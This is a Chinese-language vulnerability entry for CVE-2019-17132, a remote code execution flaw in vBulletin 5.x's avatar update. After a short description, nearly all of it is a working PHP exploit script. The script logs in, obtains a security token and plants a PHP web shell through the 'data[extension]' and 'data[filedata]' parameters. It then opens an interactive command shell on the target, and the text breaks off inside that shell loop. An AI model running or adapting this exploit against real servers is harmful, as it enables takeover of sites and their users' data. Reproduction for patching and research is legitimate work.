<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-17132）vBulletin 5.0 &lt;5.5.4-'updateAvatar'身份验证的远程代码执行漏洞</h1><h2>一、漏洞简介</h2><p>用户输入更新头像的的时候，前未正确验证提交的“数据[扩展]”和“数据[文件数据]”参数就发送到了“ ajax / api / user / updateavatar”，导致此突破的产生</p><p>利用此突破可以插入和执行任意php代码。</p><p>成功利用此突破需要“将头像另存为Files（头像保存为文件）”选项要启用（可选情况下少量）。</p><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p>&lt;?php<br /><br />/*<br />    ---------------------------------------------------------------------<br />    vBulletin &lt;= 5.5.4 (updateAvatar) 远程代码执行漏洞<br />    ---------------------------------------------------------------------<br /><br />*/<br /><br />set_time_limit(0);<br />error_reporting(E_ERROR);<br /><br />if (!extension_loaded("curl")) die("[-] cURL extension required!\n");<br /><br />print "+-------------------------------------------------------------------------+";<br />print "\n| vBulletin &lt;= 5.5.4 (updateAvatar) Remote Code Execution Exploit by EgiX |";<br />print "\n+-------------------------------------------------------------------------+\n";<br /><br />if ($argc != 4)<br />{<br />        print "\nUsage......: php $argv[0] &lt;URL&gt; &lt;Username&gt; &lt;Password&gt;\n";<br />        print "\nExample....: php $argv[0] http://localhost/vb/ user passwd";<br />        print "\nExample....: php $argv[0] [url]https://vbulletin.com/[/url] evil hacker\n\n";<br />        die();<br />}<br /><br />list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];<br /><br />$ch = curl_init();<br /><br />curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);<br />curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br />curl_setopt($ch, CURLOPT_HEADER, true);<br /><br />print &quot;\n[-] Logging in with username '{$user}' and password '{$pass}'\n&quot;;<br /><br />curl_setopt($ch, CURLOPT_URL, $url);<br /><br />if (!preg_match("/Cookie: .*sessionhash=[^;]+/", curl_exec($ch), $sid)) die("[-] Session ID not found!\n");<br /><br />curl_setopt($ch, CURLOPT_URL, "{$url}?routestring=auth/login");<br />curl_setopt($ch, CURLOPT_HTTPHEADER, $sid);<br />curl_setopt($ch, CURLOPT_POSTFIELDS, "username={$user}&amp;password={$pass}");<br /><br />if (!preg_match("/Cookie: .*sessionhash=[^;]+/", curl_exec($ch), $sid)) die("[-] Login failed!\n");<br /><br />print "[-] Logged-in! Retrieving security token...\n";<br /><br />curl_setopt($ch, CURLOPT_URL, $url);<br />curl_setopt($ch, CURLOPT_POST, false);<br />curl_setopt($ch, CURLOPT_HTTPHEADER, $sid);<br /><br />if (!preg_match('/token&quot;: &quot;([^&quot;]+)&quot;/', curl_exec($ch), $token)) die(&quot;[-] Security token not found!\n&quot;);<br /><br />print "[-] Uploading new avatar...\n";<br /><br />$params = ["profilePhotoFile" =&gt; new CURLFile("avatar.jpeg"), "securitytoken" =&gt; $token[1]];<br /><br />curl_setopt($ch, CURLOPT_URL, "{$url}?routestring=profile/upload-profilepicture");<br />curl_setopt($ch, CURLOPT_POSTFIELDS, $params);<br />curl_setopt($ch, CURLOPT_HEADER, false);<br /><br />if (($path = (json_decode(curl_exec($ch)))-&gt;avatarpath) == null) die("[-] Upload failed!\n");<br /><br />if (preg_match('/image\.php\?/', $path)) die(&quot;[-] Sorry, the 'Save Avatars as Files' option is disabled!\n&quot;);<br /><br />print "[-] Updating avatar with PHP shell...\n";<br /><br />$php_code = '&lt;?php print(&quot;____&quot;); passthru(base64_decode($_SERVER[&quot;HTTP_CMD&quot;])); ?&gt;';<br /><br />$params = ["routestring" =&gt; "ajax/api/user/updateAvatar",<br />           "userid" =&gt; 0,<br />           "avatarid" =&gt; 0,<br />           "data[extension]" =&gt; "php",<br />           "data[filedata]" =&gt; $php_code,<br />           "securitytoken" =&gt; $token[1]];<br /><br />curl_setopt($ch, CURLOPT_URL, $url);<br />curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));<br /><br />if (curl_exec($ch) !== "true") die("[-] Update failed!\n");<br /><br />print "[-] 上传shell中...\n";<br /><br />preg_match('/(\d+)\.jpeg/', $path, $m);<br />$path = preg_replace('/(\d+)\.jpeg/', ($m[1]+1).&quot;.php&quot;, $path);<br /><br />curl_setopt($ch, CURLOPT_URL, "{$url}core/{$path}");<br />curl_setopt($ch, CURLOPT_POST, false);<br /><br />while(1)<br />{<br />    print "\nvb-shell# ";<br />    if (($cmd = trim(fgets(STDIN))) == "exit") break;<br />    curl_setopt($ch, CURLOPT_HTTPHEADER, ["CMD: ".base64_encode($cmd)]);<br />    preg_match('/____(.*)/s', curl_exec($ch), $m) ? print $m[1] : die(&quot;\n[-] Exploit failed!\n&quot;);</p></body></html>